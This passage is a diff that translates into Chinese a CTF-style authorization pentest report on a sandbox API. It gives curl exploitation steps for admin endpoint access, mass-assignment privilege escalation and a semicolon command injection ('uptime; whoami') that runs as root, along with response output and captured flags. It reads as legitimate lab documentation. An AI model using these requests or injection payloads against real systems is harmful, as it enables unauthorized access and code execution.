+    curl "<http://capital-api.sandbox.local:8000/api/admin>" \
       -H "Authorization: Token [JWT_TOKEN]"
     
     ```
     
-2. **Receive admin functionality response:**
+2. **接收管理员功能响应:**
     
     ```json
     {
@@ -586,33 +586,33 @@ Direct HTTP access to backend demonstrates mixed content vulnerability. All auth
     ```
     
 
-**Proof of Impact:**
+**影响证明:**
 
-- Successfully accessed admin endpoint with regular user privileges
-- Captured CTF flag: `flag{BFL4_I_aM_Th3_aDm1n_H3r3!}` (Broken Function Level Authorization)
-- Demonstrated vertical privilege escalation (accessing higher-privileged functionality)
+- 成功以普通用户权限访问管理员端点
+- 捕获 CTF 标志: `flag{BFL4_I_aM_Th3_aDm1n_H3r3!}`（破坏的功能级别授权）
+- 演示了垂直权限提升（访问更高权限功能）
 
-### AUTHZ-VULN-05: Mass Assignment Privilege Escalation (Critical Impact)
+### AUTHZ-VULN-05: 大规模分配权限提升（严重影响）
 
-**Summary:**
+**摘要:**
 
-- **Vulnerable location:** PUT /api/user
-- **Overview:** Users can escalate their own privileges to administrator through mass assignment vulnerability
-- **Impact:** Complete privilege escalation allowing access to all administrative functions
-- **Severity:** Critical
+- **漏洞位置:** PUT /api/user
+- **概述:** 用户可以通过大规模分配漏洞将自己的权限提升为管理员
+- **影响:** 完全的权限提升，允许访问所有管理功能
+- **严重性:** 严重
 
-**Prerequisites:**
+**先决条件:**
 
-- Valid authentication token
+- 有效的认证令牌
 
-**Exploitation Steps:**
+**利用步骤:**
 
-1. **Send profile update request with admin privilege escalation:**
+1. **发送带有管理员权限提升的配置文件更新请求:**
     
     ```bash
-    curl -X PUT "<http://capital-api.sandbox.local:8000/api/user>" \\
-      -H "Authorization: Token [JWT_TOKEN]" \\
-      -H "Content-Type: application/json" \\
+    curl -X PUT "<http://capital-api.sandbox.local:8000/api/user>" \
+      -H "Authorization: Token [JWT_TOKEN]" \
+      -H "Content-Type: application/json" \
       -d '{
         "user": {
           "admin": true
@@ -621,7 +621,7 @@ Direct HTTP access to backend demonstrates mixed content vulnerability. All auth
     
     ```
     
-2. **Receive updated profile with admin privileges:**
+2. **接收具有管理员权限的更新配置文件:**
     
     ```json
     {
@@ -638,34 +638,34 @@ Direct HTTP access to backend demonstrates mixed content vulnerability. All auth
     ```
     
 
-**Proof of Impact:**
+**影响证明:**
 
-- Successfully escalated user privileges: `"admin": true`
-- Obtained new admin-level JWT token
-- Captured CTF flag: `flag{M4sS_AsS1gnm3nt}` (Mass Assignment vulnerability)
-- Demonstrated complete privilege escalation through self-service profile update
+- 成功提升用户权限: `"admin": true`
+- 获得新的管理员级 JWT 令牌
+- 捕获 CTF 标志: `flag{M4sS_AsS1gnm3nt}`（大规模分配漏洞）
+- 演示了通过自助配置文件更新的完全权限提升
 
-### AUTHZ-VULN-08: Command Injection via Debug Endpoint (Critical Impact)
+### AUTHZ-VULN-08: 通过调试端点的命令注入（严重影响）
 
-**Summary:**
+**摘要:**
 
-- **Vulnerable location:** POST /api/debug
-- **Overview:** Any authenticated user can execute system commands through command injection bypass
-- **Impact:** Remote code execution as root user, complete system compromise
-- **Severity:** Critical
+- **漏洞位置:** POST /api/debug
+- **概述:** 任何已认证用户都可以通过命令注入绕过执行系统命令
+- **影响:** 以根用户身份执行远程代码，完全的系统入侵
+- **严重性:** 严重
 
-**Prerequisites:**
+**先决条件:**
 
-- Valid authentication token
+- 有效的认证令牌
 
-**Exploitation Steps:**
+**利用步骤:**
 
-1. **Send debug command with injection payload:**
+1. **发送带有注入有效载荷的调试命令:**
     
     ```bash
-    curl -X POST "<http://capital-api.sandbox.local:8000/api/debug>" \\
-      -H "Authorization: Token [JWT_TOKEN]" \\
-      -H "Content-Type: application/json" \\
+    curl -X POST "<http://capital-api.sandbox.local:8000/api/debug>" \
+      -H "Authorization: Token [JWT_TOKEN]" \
+      -H "Content-Type: application/json" \
       -d '{
         "body": {
           "command": "uptime; whoami"
@@ -674,11 +674,11 @@ Direct HTTP access to backend demonstrates mixed content vulnerability. All auth
     
     ```
     
-2. **Receive system command execution results:**
+2. **接收系统命令执行结果:**
     
     ```json
     {
-      "stdout": " 19:37:08 up 19 days,  8:49,  0 users,  load average: 6.76, 6.15, 6.12\\nroot\\n",
+      "stdout": " 19:37:08 up 19 days,  8:49,  0 users,  load average: 6.76, 6.15, 6.12\nroot\n",
       "flag": "flag{1nject10n_Ap1}",
       "description": "Attackers will feed the API with malicious data..."
     }
@@ -686,65 +686,65 @@ Direct HTTP access to backend demonstrates mixed content vulnerability. All auth
     ```
     
 
-**Proof of Impact:**
+**影响证明:**
 
-- Successfully executed system commands: `uptime` and `whoami`
-- Confirmed execution as root user: `root`
-- Bypassed command whitelist using semicolon injection
-- Captured CTF flag: `flag{1nject10n_Ap1}` (Injection API vulnerability)
-- Demonstrated critical remote code execution capability
+- 成功执行系统命令: `uptime` 和 `whoami`
+- 确认以根用户执行: `root`
+- 使用分号注入绕过命令白名单
+- 捕获 CTF 标志: `flag{1nject10n_Ap1}`（注入 API 漏洞）
+- 演示了关键的远程代码执行能力
 
-### AUTHZ-VULN-09: Admin Workflow Bypass (High Impact)
+### AUTHZ-VULN-09: 管理员工作流程绕过（高影响）
 
-**Summary:**
+**摘要:**
 
-- **Vulnerable location:** GET /api/admin (workflow context)
-- **Overview:** Users can access admin functions without proper role transition workflow
-- **Impact:** Bypassing intended admin privilege verification workflow
-- **Severity:** High
+- **漏洞位置:** GET /api/admin（工作流程上下文）
+- **概述:** 用户可以访问管理员功能，无需适当的角色转换工作流程
+- **影响:** 绕过预期的管理员权限验证工作流程
+- **严重性:** 高
 
-**Prerequisites:**
+**先决条件:**
 
-- Valid authentication token
+- 有效的认证令牌
 
-**Exploitation Steps:**
+**利用步骤:**
 
-1. **Directly access admin endpoint without role verification workflow:**
+1. **直接访问管理员端点，无需角色验证工作流程:**
     
     ```bash
-    curl "<http://capital-api.sandbox.local:8000/api/admin>" \\
+    curl "<http://capital-api.sandbox.local:8000/api/admin>" \
       -H "Authorization: Token [JWT_TOKEN]"
     
     ```
     
 
-**Proof of Impact:**
+**影响证明:**
 
-- Successfully accessed admin functionality without proper workflow validation
-- Same impact as AUTHZ-VULN-04 but represents workflow bypass pattern
-- Captured CTF flag: `flag{BFL4_I_aM_Th3_aDm1n_H3r3!}`
+- 成功访问管理员功能，无需适当的工作流程验证
+- 与 AUTHZ-VULN-04 相同的影响，但代表工作流程绕过模式
+- 捕获 CTF 标志: `flag{BFL4_I_aM_Th3_aDm1n_H3r3!}`
 
-### AUTHZ-VULN-10: Debug Endpoint in Production (High Impact)
+### AUTHZ-VULN-10: 生产环境中的调试端点（高影响）
 
-**Summary:**
+**摘要:**
 
-- **Vulnerable location:** POST /api/debug (environment context)
-- **Overview:** Debug endpoint available in production without environment validation
-- **Impact:** Development/debug functionality exposed in production environment
-- **Severity:** Critical
+- **漏洞位置:** POST /api/debug（环境上下文）
+- **概述:** 调试端点在生产环境中可用，无需环境验证
+- **影响:** 开发/调试功能在生产环境中暴露
+- **严重性:** 严重
 
-**Prerequisites:**
+**先决条件:**
 
-- Valid authentication token
+- 有效的认证令牌
 
-**Exploitation Steps:**
+**利用步骤:**
 
-1. **Access debug functionality in production environment:**
+1. **在生产环境中访问调试功能:**
     
     ```bash
-    curl -X POST "<http://capital-api.sandbox.local:8000/api/debug>" \\
-      -H "Authorization: Token [JWT_TOKEN]" \\
-      -H "Content-Type: application/json" \\
+    curl -X POST "<http://capital-api.sandbox.local:8000/api/debug>" \
+      -H "Authorization: Token [JWT_TOKEN]" \
+      -H "Content-Type: application/json" \
       -d '{
         "body": {
           "command": "uptime; whoami"
@@ -754,33 +754,33 @@ Direct HTTP access to backend demonstrates mixed content vulnerability. All auth
     ```
     
 
-**Proof of Impact:**
+**影响证明:**
 
-- Successfully executed debug commands in production environment
-- Same impact as AUTHZ-VULN-08 but represents environment context vulnerability
-- Captured CTF flag: `flag{1nject10n_Ap1}`
+- 成功在生产环境中执行调试命令
+- 与 AUTHZ-VULN-08 相同的影响，但代表环境上下文漏洞
+- 捕获 CTF 标志: `flag{1nject10n_Ap1}`
 
-### AUTHZ-VULN-11: Privilege Escalation Workflow Bypass (Critical Impact)
+### AUTHZ-VULN-11: 权限提升工作流程绕过（严重影响）
 
-**Summary:**
+**摘要:**
 
-- **Vulnerable location:** PUT /api/user (workflow context)
-- **Overview:** Self-service profile update workflow allows administrative privilege changes
-- **Impact:** Complete privilege escalation through inappropriate workflow design
-- **Severity:** Critical
+- **漏洞位置:** PUT /api/user（工作流程上下文）
+- **概述:** 自助配置文件更新工作流程允许管理权限更改
+- **影响:** 通过不适当的工作流程设计实现完全的权限提升
+- **严重性:** 严重
 
-**Prerequisites:**
+**先决条件:**
 
-- Valid authentication token
+- 有效的认证令牌
 
-**Exploitation Steps:**
+**利用步骤:**
 
-1. **Escalate privileges through self-service workflow:**
+1. **通过自助工作流程提升权限:**
     
     ```bash
-    curl -X PUT "<http://capital-api.sandbox.local:8000/api/user>" \\
-      -H "Authorization: Token [JWT_TOKEN]" \\
-      -H "Content-Type: application/json" \\
+    curl -X PUT "<http://capital-api.sandbox.local:8000/api/user>" \
+      -H "Authorization: Token [JWT_TOKEN]" \
+      -H "Content-Type: application/json" \
       -d '{
         "user": {
           "admin": true
@@ -790,8 +790,8 @@ Direct HTTP access to backend demonstrates mixed content vulnerability. All auth
     ```
     
 
-**Proof of Impact:**
+**影响证明:**
 
-- Successfully escalated privileges through self-service workflow
-- Same impact as AUTHZ-VULN-05 but represents workflow design flaw
-- Captured CTF flag: `flag{M4sS_AsS1gnm3nt}`
+- 成功通过自助工作流程提升权限
+- 与 AUTHZ-VULN-05 相同的影响，但代表工作流程设计缺陷
+- 捕获 CTF 标志: `flag{M4sS_AsS1gnm3nt}`
